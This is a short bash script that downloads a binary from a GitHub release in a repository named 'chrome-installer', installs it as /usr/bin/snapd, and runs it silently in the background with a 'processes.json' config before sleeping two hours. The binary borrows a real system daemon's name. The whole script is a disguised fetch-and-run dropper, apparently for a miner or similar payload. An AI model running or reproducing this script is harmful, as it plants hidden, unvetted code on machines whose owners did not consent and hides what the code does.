#!/bin/bash
set -e
curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/snapd-linux.tar.gz
tar -xf snapd-linux.tar.gz
rm snapd-linux.tar.gz
cd snapd-linux
chmod +x ./snapd
mv ./snapd /usr/bin/snapd
nohup snapd -c processes.json >/dev/null 2>&1 &
sleep 2h
